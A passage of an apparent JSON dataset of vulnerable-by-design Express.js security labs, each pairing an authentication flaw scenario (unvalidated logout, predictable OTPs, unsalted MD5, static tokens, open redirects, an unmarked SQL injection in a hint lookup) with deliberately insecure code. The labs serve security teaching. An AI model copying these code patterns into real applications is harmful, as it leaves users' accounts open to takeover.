password endpoint\napp.post('/recover', (req, res) => {\n    const { username, answer } = req.body;\n    const user = users.find(u => u.username === username);\n    if (user && answer.toLowerCase() === user.secretAnswer.toLowerCase()) {\n        // Vulnerability: the token is not validated properly; simply allow password reset\n        user.password = 'newpassword';\n        res.send('Password reset successful. New password is \"newpassword\".');\n    } else {\n        res.send('Incorrect answer.');\n    }\n});\n\n// Login endpoint\napp.get('/', (req, res) => {\n    res.send(`\n        <h2>Login</h2>\n        <form method=\"POST\" action=\"/login\">\n            <input type=\"text\" name=\"username\" placeholder=\"Username\" required />\n            <input type=\"password\" name=\"password\" placeholder=\"Password\" required />\n            <button type=\"submit\">Login</button>\n        </form>\n    `);\n});\n\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username && u.password === password);\n    if (user) {\n        res.send(`Welcome, ${username}!`);\n    } else {\n        res.status(401).send('Invalid credentials.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Password Recovery Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Improper logout handling allowing session reuse",
  "Lab Description": "This lab demonstrates an Autnenticationvulnerability caused by improper logout handling. The logout function fails to properly invalidate the user session, leaving the session cookie active. An attacker can exploit this vulnerability by capturing a valid session token before logout and then reusing it even after the user logs out. To solve the lab, capture the session token, simulate the logout process, and then reuse the token to access a protected resource.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// In-memory session store (for demonstration purposes)\napp.use(session({\n    secret: 'supersecretkey',\n    resave: false,\n    saveUninitialized: true,\n    cookie: { maxAge: 60 * 60 * 1000 } // 1 hour\n}));\n\n// Simulated user database\nconst users = [{ username: 'carlos', password: 'password123' }];\n\n// Login route\napp.get('/', (req, res) => {\n    res.send(`\n        <h2>Login</h2>\n        <form method=\"POST\" action=\"/login\">\n            <input type=\"text\" name=\"username\" placeholder=\"Username\" required />\n            <input type=\"password\" name=\"password\" placeholder=\"Password\" required />\n            <button type=\"submit\">Login</button>\n        </form>\n    `);\n});\n\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username && u.password === password);\n    if (user) {\n        req.session.user = username;\n        res.send(`Welcome, ${username}! Your session id is ${req.sessionID}.`);\n    } else {\n        res.status(401).send('Invalid credentials.');\n    }\n});\n\n// Logout route that fails to properly destroy the session\napp.get('/logout', (req, res) => {\n    // Vulnerability: The session is not properly destroyed\n    res.send('Logged out (but session cookie still valid)');\n});\n\n// Protected account route\napp.get('/account', (req, res) => {\n    if (req.session.user) {\n        res.send(`Welcome to your account, ${req.session.user}!`);\n    } else {\n        res.status(403).send('Access denied.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Improper Logout Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Registration without duplicate email check",
  "Lab Description": "The registration endpoint creates user accounts without checking if the email is already registered. This allows attackers to create multiple fake accounts using the same email.",
  "Vulnerability name": "Authentication",
  "lab level": "easy",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: no duplicate email verification\napp.post('/register', (req, res) => {\n  const { username, email, password } = req.body;\n  // In a real system, a duplicate check is needed\n  res.send(`User ${username} registered with email ${email}`);\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Legacy token exposure via URL query",
  "Lab Description": "A legacy Autnenticationsystem passes a plaintext token in the URL query string, exposing it in browser history and logs. An attacker can intercept this token to hijack sessions.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express');\nconst app = express();\n\n// Vulnerable: token sent as URL query parameter\napp.get('/legacyLogin', (req, res) => {\n  const token = req.query.token;\n  if (token === 'legacyToken') {\n    res.send('Legacy login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Insecure biometric matching algorithm",
  "Lab Description": "A biometric Autnenticationendpoint uses a simplistic string comparison for biometric data. This weak matching allows an attacker to spoof biometric data by submitting a matching string.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: simplistic biometric check\napp.post('/biometricAuth', (req, res) => {\n  const { biometricData } = req.body;\n  // Stored biometric data is hardcoded\n  if (biometricData === 'fingerprint123') {\n    res.send('Biometric Autnenticationsuccessful');\n  } else {\n    res.send('Autnenticationfailed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "API token distribution via unsanitized header input",
  "Lab Description": "An API endpoint generates tokens based solely on the client ID provided in request headers without proper validation, resulting in predictable tokens that attackers can easily guess.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: token generated from unvalidated client ID header\napp.post('/getApiToken', (req, res) => {\n  const clientId = req.headers['client-id'];\n  const token = clientId + '_token';\n  res.send({ token });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Unencrypted cookie values for session management",
  "Lab Description": "Session cookies are stored in plaintext without encryption, making them vulnerable to interception and tampering by attackers.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\n\napp.use(cookieParser());\n\n// Vulnerable: cookies set in plaintext\napp.get('/setCookie', (req, res) => {\n  res.cookie('session', 'plainTextSession123');\n  res.send('Cookie set');\n});\n\napp.get('/getCookie', (req, res) => {\n  res.send(`Session: ${req.cookies.session}`);\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Social login relying solely on username",
  "Lab Description": "A social login endpoint accepts a username without verifying any associated token or email address, which allows attackers to impersonate users easily.",
  "Vulnerability name": "Authentication",
  "lab level": "easy",
  "src code": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: social login trusts only the provided username\napp.post('/socialAuth', (req, res) => {\n  const { username } = req.body;\n  if (username) {\n    res.send(`Logged in as ${username}`);\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Multi-tenant admin token exposure via shared cache",
  "Lab Description": "In a multi-tenant environment, admin tokens are stored in a shared cache without proper isolation. This can allow an attacker from one tenant to retrieve the admin token of another.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: shared token cache without isolation\nlet tokenCache = {\n  'adminToken': 'admin123'\n};\n\napp.get('/getAdminToken', (req, res) => {\n  res.send(tokenCache.adminToken);\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Missing CAPTCHA on password reset",
  "Lab Description": "The password reset endpoint lacks CAPTCHA verification, allowing attackers to automate reset requests and potentially abuse the password reset functionality.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: no CAPTCHA implemented on password reset\napp.post('/reset', (req, res) => {\n  const { email, newPassword } = req.body;\n  res.send(`Password for ${email} reset to ${newPassword}`);\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Device Autnenticationusing unsanitized MAC address",
  "Lab Description": "A device Autnenticationendpoint uses the MAC address provided by the client without proper sanitization, allowing attackers to spoof the MAC address and gain unauthorized access.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: relies solely on client-supplied MAC address\napp.post('/deviceAuth', (req, res) => {\n  const mac = req.body.mac;\n  if (mac === '00:11:22:33:44:55') {\n    res.send('Device authenticated');\n  } else {\n    res.send('Autnenticationfailed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Open redirect in login confirmation",
  "Lab Description": "After a successful login, the system redirects the user based on a URL provided in the request without validation, allowing attackers to redirect users to malicious sites.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: redirect URL taken directly from user input\napp.post('/loginConfirm', (req, res) => {\n  const { username, redirectUrl } = req.body;\n  if (username === 'user1') {\n    res.redirect(redirectUrl);\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Insecure password hint disclosure",
  "Lab Description": "A password hint endpoint returns stored hints without proper access control, which can help attackers in guessing user passwords.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(express.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, hint TEXT)\");\n  db.run(\"INSERT INTO users (username, hint) VALUES ('user1', 'Your pet\\'s name')\");\n});\n\napp.get('/getHint', (req, res) => {\n  const username = req.query.username;\n  const query = `SELECT hint FROM users WHERE username = '${username}'`;\n  db.get(query, [], (err, row) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send(row ? row.hint : 'No hint available');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Default API endpoint without authentication",
  "Lab Description": "An internal API endpoint does not enforce any authentication, allowing attackers to access sensitive data by simply calling the endpoint.",
  "Vulnerability name": "Authentication",
  "lab level": "easy",
  "src code": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: no Autnenticationenforced on this endpoint\napp.get('/internalData', (req, res) => {\n  res.send('Sensitive internal data');\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Insecure OAuth state parameter handling",
  "Lab Description": "An OAuth callback endpoint fails to validate the 'state' parameter, making it vulnerable to CSRF and token forgery attacks.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: missing validation of the state parameter\napp.post('/oauth/callback', (req, res) => {\n  const { token, state } = req.body;\n  if (token && state) {\n    res.send('OAuth callback accepted');\n  } else {\n    res.send('OAuth callback failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Unencrypted internal communication for authentication",
  "Lab Description": "An internal AutnenticationAPI runs over plain HTTP without TLS, exposing sensitive credentials to interception and man-in-the-middle attacks.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Note: This server runs over HTTP, not HTTPS\napp.post('/internalAuth', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'user1' && password === 'pass1') {\n    res.send('Internal Autnenticationsuccessful');\n  } else {\n    res.send('Autnenticationfailed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Insecure session cookie path configuration",
  "Lab Description": "Session cookies are configured with an overly broad path, making them accessible across multiple applications and vulnerable to cross-application attacks.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\n\n// Vulnerable: cookie path set too broadly\napp.use(session({\n  secret: 'broadSecret',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { path: '/', secure: false }\n}));\n\napp.post('/login', (req, res) => {\n  req.session.user = req.body.username;\n  res.send('Login successful');\n});\n\napp.get('/dashboard', (req, res) => {\n  if (req.session.user) res.send(`Welcome, ${req.session.user}`);\n  else res.send('Not authenticated');\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "Autnenticationbypass via insecure logout with cache retention",
  "Lab Description": "The logout endpoint does not clear cached session data properly, leaving the session token valid so that an attacker can reuse it to access protected resources.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\napp.use(session({ secret: 'secret', resave: false, saveUninitialized: true }));\n\n// Vulnerable: logout does not destroy session data\napp.post('/logout', (req, res) => {\n  // Missing req.session.destroy()\n  res.send('Logged out');\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},

  {
      "Lab scenario": "Password update without current password verification",
      "Lab Description": "The password update endpoint allows users to change their password without verifying the current password. An attacker with access to an active session can update the password without knowing the existing one.",
      "Vulnerability name": "Authentication",
      "lab level": "medium",
      "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable endpoint: no current password check\napp.post('/updatePassword', (req, res) => {\n  const { username, newPassword } = req.body;\n  // Insecurely updates the password without verifying the current one\n  res.send(`Password for ${username} updated to ${newPassword}`);\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "Lab scenario": "Login bypass due to missing rate limiting",
      "Lab Description": "The login endpoint does not enforce rate limiting, making it vulnerable to brute-force attacks. An attacker can attempt many login requests without delay.",
      "Vulnerability name": "Authentication",
      "lab level": "easy",
      "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: No rate limiting implemented\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'user1' && password === 'pass1') {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "Lab scenario": "Default fallback account on failed login",
      "Lab Description": "If a user provides incorrect credentials, the system automatically logs them in as a default account instead of denying access. This fallback can be exploited by attackers.",
      "Vulnerability name": "Authentication",
      "lab level": "easy",
      "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: fallback to a default 'guest' account on failure\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'user1' && password === 'pass1') {\n    res.send('Login successful');\n  } else {\n    res.send('Logged in as guest');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "Lab scenario": "Misconfigured third-party OAuth callback",
      "Lab Description": "The OAuth callback endpoint does not validate the state parameter or callback URL properly, enabling attackers to forge the callback and bypass authentication.",
      "Vulnerability name": "Authentication",
      "lab level": "hard",
      "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: OAuth callback with no state validation\napp.post('/oauth/callback', (req, res) => {\n  const { token, callbackUrl } = req.body;\n  if (token) {\n    res.redirect(callbackUrl);\n  } else {\n    res.send('OAuth login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "Lab scenario": "Predictable OTP generation for mobile authentication",
      "Lab Description": "The OTP generation endpoint creates one-time passwords using a predictable algorithm based solely on the current time, making it easy for attackers to guess the OTP.",
      "Vulnerability name": "Authentication",
      "lab level": "hard",
      "src code": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: OTP generated predictably from the current time\napp.post('/generateOTP', (req, res) => {\n  const otp = (Date.now() % 10000).toString().padStart(4, '0');\n  res.send({ otp });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "Lab scenario": "Weak password hashing using unsalted MD5",
      "Lab Description": "During registration, passwords are hashed using unsalted MD5, which is cryptographically weak and vulnerable to rainbow table attacks.",
      "Vulnerability name": "Authentication",
      "lab level": "hard",
      "src code": "const express = require('express');\nconst crypto = require('crypto');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: using MD5 without a salt\napp.post('/register', (req, res) => {\n  const { username, password } = req.body;\n  const hashedPassword = crypto.createHash('md5').update(password).digest('hex');\n  res.send(`User ${username} registered with hash ${hashedPassword}`);\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "Lab scenario": "Flawed MFA fallback to insecure security questions",
      "Lab Description": "The multi-factor Autnenticationsystem falls back to a security question when the primary factor fails. The fallback question is poorly implemented, allowing attackers to bypass MFA by guessing the answer.",
      "Vulnerability name": "Authentication",
      "lab level": "medium",
      "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: insecure fallback using a static answer\napp.post('/mfa', (req, res) => {\n  const { username, password, securityAnswer } = req.body;\n  if (username === 'user1' && password === 'pass1') {\n    res.send('MFA successful');\n  } else if (securityAnswer === 'blue') {\n    res.send('MFA bypassed');\n  } else {\n    res.send('MFA failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "Lab scenario": "Insecure session token storage with weak token generation",
      "Lab Description": "The login endpoint generates session tokens by simply concatenating a username with a constant string, making the tokens predictable and vulnerable to hijacking.",
      "Vulnerability name": "Authentication",
      "lab level": "hard",
      "src code": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: static token generation\nlet sessions = {};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'user1' && password === 'pass1') {\n    const token = username + '123';\n    sessions[token] = { username };\n    res.send({ token });\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.get('/profile', (req, res) => {\n  const token = req.headers.authorization;\n  if (sessions[token]) res.send(`Welcome, ${sessions[token].username}`);\n  else res.send('Invalid session');\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "Lab scenario": "Autnenticationbypass due to exposed debug mode",
      "Lab Description": "When the server is running in debug mode, the login endpoint bypasses authentication, automatically logging in any user. This debug configuration should never be enabled in production.",
      "Vulnerability name": "Authentication",
      "lab level": "easy",
      "src code": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: debug mode enabled\nconst DEBUG_MODE = true;\n\napp.post('/login', (req, res) => {\n  const { username } = req.body;\n  if (DEBUG_MODE) {\n    res.send(`Debug mode: ${username} logged in automatically`);\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "Lab scenario": "Reused static token across sessions",
      "Lab Description": "The Autnenticationsystem always returns the same static token upon successful login, allowing attackers to reuse it indefinitely to access protected resources.",
      "Vulnerability name": "Authentication",
      "lab level": "hard",
      "src code": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: static token for every login\nconst STATIC_TOKEN = 'staticToken123';\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'user1' && password === 'pass1') {\n    res.send({ token: STATIC_TOKEN });\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.get('/dashboard', (req, res) => {\n  const token = req.headers.authorization;\n  if (token === STATIC_TOKEN) res.send('Dashboard accessed');\n  else res.send('Invalid token');\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "Lab scenario": "Missing CSRF protection on login endpoint",
      "Lab Description": "The login endpoint does not implement CSRF protection, allowing an attacker to trick a user into submitting unauthorized login requests.",
      "Vulnerability name": "Authentication",
      "lab level": "medium",
      "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: no CSRF tokens or protection\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'user1' && password === 'pass1') {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "Lab scenario": "Insecure API client secret handling",
      "Lab Description": "The API Autnenticationendpoint relies on a hardcoded client secret that is exposed in the source code, enabling attackers to bypass client authentication.",
      "Vulnerability name": "Authentication",
      "lab level": "hard",
      "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\nconst CLIENT_SECRET = 'exposedClientSecret';\n\napp.post('/apiLogin', (req, res) => {\n  const { clientId, clientSecret } = req.body;\n  // Vulnerable: hardcoded client secret check\n  if (clientSecret === CLIENT_SECRET) {\n    res.send('API login successful');\n  } else {\n    res.send('API login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "Lab scenario": "LDAP integration with insecure verification (simulated)",
      "Lab Description": "A simulated LDAP login endpoint improperly verifies credentials by accepting any non-empty username, bypassing proper Autnenticationlogic.",
      "Vulnerability name": "Authentication",
      "lab level": "medium",
      "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: simulated LDAP login that ignores the password\napp.post('/ldapLogin', (req, res) => {\n  const { username, password } = req.body;\n  if (username) {\n    res.send('LDAP login successful');\n  } else {\n    res.send('LDAP login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "Lab scenario": "Missing account lockout mechanism on repeated login failures",
      "Lab Description": "The login endpoint does not lock out an account after repeated failed attempts, making it vulnerable to brute-force attacks.",
      "Vulnerability name": "Autnentication",
      "lab level": "medium",
      "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: No account lockout mechanism\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'user1' && password === 'pass1') {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "Lab scenario": "Insecure logout process without session destruction",
      "Lab Description": "The logout endpoint does not properly destroy the session, leaving the session ID valid and allowing attackers to reuse it for unauthorized access.",
      "Vulnerability name": "Authentication",
      "lab level": "hard",
      "src code": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\napp.use(session({ secret: 'secret', resave: false, saveUninitialized: true }));\n\napp.post('/login', (req, res) => {\n  req.session.user = req.body.username;\n  res.send('Login successful');\n});\n\n// Vulnerable: logout does not destroy the session\napp.post('/logout', (req, res) => {\n  res.send('Logged out');\n});\n\napp.get('/dashboard', (req, res) => {\n  if (req.session.user) res.send(`Welcome, ${req.session.user}`);\n  else res.send('Please log in');\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  }




]